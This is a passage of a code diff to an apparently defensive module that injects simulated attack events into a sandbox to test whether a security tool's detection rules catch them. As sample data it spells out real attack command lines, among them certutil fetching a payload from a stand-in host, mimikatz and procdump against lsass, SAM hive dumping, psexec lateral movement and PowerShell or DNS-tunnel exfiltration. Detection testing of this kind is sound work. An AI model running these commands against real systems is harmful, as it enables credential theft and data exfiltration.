+            "exe": r"C:\Windows\System32\certutil.exe",
+            "cmdline": "certutil.exe -urlcache -split -f http://evil.test/payload.exe C:\\Temp\\payload.exe",
+        }
 
-        sample = lolbin_samples[event_index % len(lolbin_samples)]
+        sample = self._generate_unique_attack("lolbin_abuse", base)
         fake_event = {
             **sample,
             "parent_name": "explorer.exe",
@@ -841,12 +1085,12 @@ class AgentSmith(BaseModule):
         }
 
         self._inject_simulated_process(fake_event)
-        detection = self._check_detection(attack_id, "lolbin_abuse", f"LOLBin abuse: {sample['name']}", fake_event)
+        detection = self._check_detection(attack_id, "lolbin_abuse", f"LOLBin abuse: {sample.get('name', '?')}", fake_event)
 
         return {
             "attack_id": attack_id,
             "category": "lolbin_abuse",
-            "description": f"LOLBin abuse via {sample['name']}",
+            "description": f"LOLBin abuse via {sample.get('name', '?')}",
             "injected_event": fake_event,
             "detection": detection,
             "timestamp": now,
@@ -854,45 +1098,20 @@ class AgentSmith(BaseModule):
         }
 
     async def _simulate_credential_dump(self, event_index: int) -> dict:
-        """Inject fake credential dumping activity."""
+        """Inject fake credential dumping activity with mutation."""
         attack_id = f"{self._session_id}-cred-{event_index}"
         now = datetime.now(timezone.utc).isoformat()
 
-        cred_samples = [
-            {
-                "name": "procdump64.exe",
-                "pid": 94001 + event_index,
-                "exe": r"C:\Tools\procdump64.exe",
-                "cmdline": "procdump64.exe -accepteula -ma lsass.exe lsass.dmp",
-                "target_process": "lsass.exe",
-                "details": "Process dump of lsass.exe",
-            },
-            {
-                "name": "reg.exe",
-                "pid": 94101 + event_index,
-                "exe": r"C:\Windows\System32\reg.exe",
-                "cmdline": r"reg.exe save HKLM\SAM C:\Temp\sam.hive",
-                "file_path": r"c:\windows\system32\config\sam",
-                "details": "SAM hive registry save",
-            },
-            {
-                "name": "mimikatz.exe",
-                "pid": 94201 + event_index,
-                "exe": r"C:\Users\attacker\mimikatz.exe",
-                "cmdline": "mimikatz.exe sekurlsa::logonpasswords exit",
-                "target_process": "lsass.exe",
-                "details": "Mimikatz credential extraction targeting lsass.exe",
-            },
-            {
-                "name": "secretsdump.py",
-                "pid": 94301 + event_index,
-                "exe": r"C:\Python39\python.exe",
-                "cmdline": "python.exe secretsdump.py -sam SAM -system SYSTEM LOCAL",
-                "details": "Impacket secretsdump offline credential extraction",
-            },
-        ]
+        base = {
+            "name": "procdump64.exe",
+            "pid": 94001,
+            "exe": r"C:\Tools\procdump64.exe",
+            "cmdline": "procdump64.exe -accepteula -ma lsass.exe lsass.dmp",
+            "target_process": "lsass.exe",
+            "details": "Process dump of lsass.exe",
+        }
 
-        sample = cred_samples[event_index % len(cred_samples)]
+        sample = self._generate_unique_attack("credential_dump", base)
         fake_event = {
             **sample,
             "parent_name": "cmd.exe",
@@ -904,12 +1123,12 @@ class AgentSmith(BaseModule):
         }
 
         self._inject_simulated_process(fake_event)
-        detection = self._check_detection(attack_id, "credential_dump", f"Credential dump: {sample['name']}", fake_event)
+        detection = self._check_detection(attack_id, "credential_dump", f"Credential dump: {sample.get('name', '?')}", fake_event)
 
         return {
             "attack_id": attack_id,
             "category": "credential_dump",
-            "description": f"Credential dumping via {sample['name']}",
+            "description": f"Credential dumping via {sample.get('name', '?')}",
             "injected_event": fake_event,
             "detection": detection,
             "timestamp": now,
@@ -917,45 +1136,20 @@ class AgentSmith(BaseModule):
         }
 
     async def _simulate_lateral_movement(self, event_index: int) -> dict:
-        """Inject fake lateral movement activity."""
+        """Inject fake lateral movement activity with mutation."""
         attack_id = f"{self._session_id}-lateral-{event_index}"
         now = datetime.now(timezone.utc).isoformat()
 
-        lateral_samples = [
-            {
-                "name": "psexec.exe",
-                "pid": 95001 + event_index,
-                "exe": r"C:\Tools\PsExec.exe",
-                "cmdline": r"psexec.exe \\SERVER01 -u admin -p pass cmd.exe",
-                "details": "PsExec remote execution to SERVER01",
-                "event_id": 7045,
-            },
-            {
-                "name": "PSEXESVC.exe",
-                "pid": 95101 + event_index,
-                "exe": r"C:\Windows\PSEXESVC.exe",
-                "cmdline": r"C:\Windows\PSEXESVC.exe",
-                "details": "PsExec service installed on remote host",
-                "event_id": 7045,
-            },
-            {
-                "name": "wmic.exe",
-                "pid": 95201 + event_index,
-                "exe": r"C:\Windows\System32\wbem\wmic.exe",
-                "cmdline": "wmic.exe /node:192.168.1.50 process call create cmd.exe",
-                "details": "WMI remote process creation on 192.168.1.50",
-            },
-            {
-                "name": "schtasks.exe",
-                "pid": 95301 + event_index,
-                "exe": r"C:\Windows\System32\schtasks.exe",
-                "cmdline": r"schtasks.exe /create /s SERVER02 /tn backdoor /tr C:\Temp\shell.exe /sc minute /mo 5",
-                "details": "Remote scheduled task creation on SERVER02",
-                "event_id": 4698,
-            },
-        ]
+        base = {
+            "name": "psexec.exe",
+            "pid": 95001,
+            "exe": r"C:\Tools\PsExec.exe",
+            "cmdline": r"psexec.exe \\SERVER01 -u admin -p pass cmd.exe",
+            "details": "PsExec remote execution to SERVER01",
+            "event_id": 7045,
+        }
 
-        sample = lateral_samples[event_index % len(lateral_samples)]
+        sample = self._generate_unique_attack("lateral_movement", base)
         fake_event = {
             **sample,
             "parent_name": "cmd.exe",
@@ -967,12 +1161,12 @@ class AgentSmith(BaseModule):
         }
 
         self._inject_simulated_process(fake_event)
-        detection = self._check_detection(attack_id, "lateral_movement", f"Lateral movement: {sample['name']}", fake_event)
+        detection = self._check_detection(attack_id, "lateral_movement", f"Lateral movement: {sample.get('name', '?')}", fake_event)
 
         return {
             "attack_id": attack_id,
             "category": "lateral_movement",
-            "description": f"Lateral movement via {sample['name']}",
+            "description": f"Lateral movement via {sample.get('name', '?')}",
             "injected_event": fake_event,
             "detection": detection,
             "timestamp": now,
@@ -980,69 +1174,43 @@ class AgentSmith(BaseModule):
         }
 
     async def _simulate_exfiltration(self, event_index: int) -> dict:
-        """Inject fake data exfiltration activity."""
+        """Inject fake data exfiltration activity with mutation."""
         attack_id = f"{self._session_id}-exfil-{event_index}"
         now = datetime.now(timezone.utc).isoformat()
 
-        exfil_samples = [
-            {
-                "remote_addr": "203.0.113.42",
-                "remote_port": 443,
-                "local_port": 50000 + event_index,
-                "status": "ESTABLISHED",
-                "pid": 96001 + event_index,
-                "name": "curl.exe",
-                "bytes_sent": 75_000_000,
-                "event_type": "network_transfer",
-                "transfer_size": 75_000_000,
-                "cmdline": "",
-                "details": "Large outbound data transfer: 75MB to 203.0.113.42",
-            },
-            {
-                "remote_addr": "198.51.100.10",
-                "remote_port": 53,
-                "local_port": 50100 + event_index,
-                "status": "ESTABLISHED",
-                "pid": 96101 + event_index,
-                "name": "dns_tunnel.exe",
-                "bytes_sent": 5_000_000,
-                "dns_query": "aGVsbG8gd29ybGQ.c2VjcmV0LWRhdGEtZXhmaWx0cmF0aW9uLXRlc3Q.data.evil.test",
-                "cmdline": "nslookup -type=txt aGVsbG8gd29ybGQ.data.evil.test",
-                "details": "DNS tunneling exfiltration via long subdomain queries",
-            },
-            {
-                "remote_addr": "192.0.2.55",
-                "remote_port": 8080,
-                "local_port": 50200 + event_index,
-                "status": "ESTABLISHED",
-                "pid": 96201 + event_index,
-                "name": "powershell.exe",
-                "bytes_sent": 100_000_000,
-                "event_type": "network_transfer",
-                "transfer_size": 100_000_000,
-                "cmdline": "powershell.exe Invoke-WebRequest -Uri http://192.0.2.55:8080/upload -Method POST -InFile data.zip",
-                "details": "PowerShell upload exfiltration: 100MB",
-            },
-        ]
+        base = {
+            "remote_addr": "203.0.113.42",
+            "remote_port": 443,
+            "local_port": 50000,
+            "status": "ESTABLISHED",
+            "pid": 96001,
+            "name": "curl.exe",
+            "bytes_sent": 75_000_000,
+            "event_type": "network_transfer",
+            "transfer_size": 75_000_000,
+            "cmdline": "",
+            "details": "Large outbound data transfer: 75MB to 203.0.113.42",
+        }
 
-        sample = exfil_samples[event_index % len(exfil_samples)]
+        sample = self._generate_unique_attack("exfiltration", base)
         fake_event = {
             **sample,
+            "status": "ESTABLISHED",
+            "event_type": "network_transfer",
+            "local_port": random.randint(49152, 65535),
             "timestamp": now,
             "_smith_simulation": True,
             "_smith_attack_id": attack_id,
             "_smith_session_id": self._session_id,
         }
 
-        # Inject into network sentinel simulated list
         self._inject_simulated_connection(fake_event)
-
-        detection = self._check_detection(attack_id, "exfiltration", f"Exfiltration via {sample['name']}", fake_event)
+        detection = self._check_detection(attack_id, "exfiltration", f"Exfiltration via {sample.get('name', '?')}", fake_event)
 
         return {
             "attack_id": attack_id,
             "category": "exfiltration",
-            "description": f"Data exfiltration via {sample['name']} to {sample['remote_addr']}",
+            "description": f"Data exfiltration via {sample.get('name', '?')} to {sample.get('remote_addr', '?')}",
             "injected_event": fake_event,
             "detection": detection,
             "timestamp": now,
@@ -1074,18 +1242,10 @@ class AgentSmith(BaseModule):
     # ------------------------------------------------------------------
 
     def _check_detection(self, attack_id: str, category: str, description: str, fake_event: dict) -> dict:
-        """Check if Cereberus detected the simulated attack.
-
-        Evaluates the fake event against the rule engine and checks the
-        alert manager for any matching recent alerts.
-
-        Returns:
-            dict with detected (bool), matches (list), and Smith commentary.
-        """
+        """Check if Cereberus detected the simulated attack."""
         detected = False
         rule_matches: list[dict] = []
 
-        # Test against rule engine
         if self._rule_engine is not None:
             try:
                 matches = self._rule_engine.evaluate(fake_event)
@@ -1104,7 +1264,6 @@ class AgentSmith(BaseModule):
             except Exception as exc:
                 logger.error("smith_detection_check_error", error=str(exc), attack_id=attack_id)
 
-        # Check alert manager for recent alerts that might correspond
         alert_matches: list[dict] = []
         if self._alert_manager is not None:
             try:
@@ -1148,7 +1307,6 @@ class AgentSmith(BaseModule):
         detection_rate = detected_count / total_attacks if total_attacks > 0 else 0.0
         verdict = _verdict(detection_rate)
 
-        # Per-category breakdown
         category_results: dict[str, dict] = {}
         for attack in self._current_attacks:
             cat = attack.get("category", "unknown")
@@ -1168,7 +1326,6 @@ class AgentSmith(BaseModule):
             cat_total = cat_data["total"]
             cat_data["detection_rate"] = cat_data["detected"] / cat_total if cat_total > 0 else 0.0
 
-        # Identify weaknesses
         weak_categories = [
             cat for cat, data in category_results.items()
             if data["detection_rate"] < 0.5
@@ -1178,7 +1335,6 @@ class AgentSmith(BaseModule):
             if data["detection_rate"] == 0.0 and data["total"] > 0
         ]
 
-        # Recommendations
         recommendations: list[str] = []
         if "malware_process" in blind_spots:
             recommendations.append("Enable or tune process-based detection rules for known malware families.")
@@ -1226,14 +1382,10 @@ class AgentSmith(BaseModule):
     # ------------------------------------------------------------------
 
     def _check_invariants(self) -> None:
-        """Validate all containment invariants before each attack.
-
-        Raises SmithContainmentBreach if any invariant is violated.
-        """
+        """Validate all containment invariants before each attack."""
         if not self._active:
             raise SmithContainmentBreach("Session not active")
 
-        # Time limit check
         if self._session_start:
             elapsed = (datetime.now(timezone.utc) - self._session_start).total_seconds()
             if elapsed > self._ABSOLUTE_MAX_DURATION:
@@ -1241,25 +1393,16 @@ class AgentSmith(BaseModule):
                     f"Session exceeded maximum duration: {elapsed:.0f}s > {self._ABSOLUTE_MAX_DURATION}s"
                 )
 
-        # Event count check
         if self._events_injected >= self._ABSOLUTE_MAX_EVENTS:
             raise SmithContainmentBreach(
                 f"Maximum event count reached: {self._events_injected} >= {self._ABSOLUTE_MAX_EVENTS}"
             )
 
-        # Sandbox directory check
         if not self._sandbox_dir.exists():
             raise SmithContainmentBreach(f"Sandbox directory missing: {self._sandbox_dir}")
 
     def _validate_sandbox_path(self, path: str) -> bool:
-        """Ensure a path is strictly within the sandbox directory.
-
-        Args:
-            path: The path to validate.
-
-        Returns:
-            True if the path is within the sandbox, False otherwise.
-        """
+        """Ensure a path is strictly within the sandbox directory."""
         try:
             resolved = Path(path).resolve()
             sandbox_resolved = self._sandbox_dir.resolve()
@@ -1290,7 +1433,6 @@ class AgentSmith(BaseModule):
                         session_id=self._session_id,
                     )
 
-                    # Force kill the session task
                     if self._session_task and not self._session_task.done():
                         self._session_task.cancel()
                         try:
@@ -1298,7 +1440,6 @@ class AgentSmith(BaseModule):
                         except (asyncio.CancelledError, Exception):
                             pass
 
-                    # Generate results and cleanup
                     report = self._generate_results_report()
                     await self._cleanup()
 
@@ -1317,7 +1458,6 @@ class AgentSmith(BaseModule):
                     )
                     break
 
-                # Also enforce time limit via watchdog
                 if self._session_start:
                     elapsed = (datetime.now(timezone.utc) - self._session_start).total_seconds()
                     if elapsed > self._ABSOLUTE_MAX_DURATION:
@@ -1355,30 +1495,22 @@ class AgentSmith(BaseModule):
     # ------------------------------------------------------------------
 
     async def _cleanup(self) -> None:
-        """Remove ALL injected data from all modules and clear sandbox.
-
-        This is the critical safety net -- ensures no simulated data
-        persists in any module after a session ends.
-        """
+        """Remove ALL injected data from all modules and clear sandbox."""
         session_id = self._session_id or "cleanup"
         logger.info("smith_cleanup_start", session_id=session_id)
 
-        # Clean simulated processes from process analyzer
         if self._process_analyzer is not None and hasattr(self._process_analyzer, "_simulated_processes"):
             removed = len(self._process_analyzer._simulated_processes)
             self._process_analyzer._simulated_processes.clear()
             logger.info("smith_cleaned_processes", removed=removed)
 
-        # Clean simulated connections from network sentinel
         if self._network_sentinel is not None and hasattr(self._network_sentinel, "_simulated_connections"):
             removed = len(self._network_sentinel._simulated_connections)
             self._network_sentinel._simulated_connections.clear()
             logger.info("smith_cleaned_connections", removed=removed)
 
-        # Clean sandbox filesystem
         if self._sandbox_dir.exists():
             try:
-                # Remove all contents but keep the directory
                 for item in self._sandbox_dir.iterdir():
                     if item.is_dir():
                         shutil.rmtree(item, ignore_errors=True)
@@ -1388,7 +1520,6 @@ class AgentSmith(BaseModule):
             except Exception as exc:
                 logger.error("smith_sandbox_cleanup_error", error=str(exc))
 
-        # Clear current session attack data
         self._current_attacks.clear()
         self._events_injected = 0
 
@@ -1404,14 +1535,12 @@ class AgentSmith(BaseModule):
             return False
 
         try:
-            # Check for open or investigating incidents
             for status in ("open", "investigating", "contained"):
                 incidents = await self._incident_manager.list_incidents(status=status, limit=1)
                 if incidents:
                     return True
         except Exception as exc:
             logger.error("smith_incident_check_error", error=str(exc))
-            # Fail safe -- if we cannot check, assume incidents exist
             return True
 
         return False
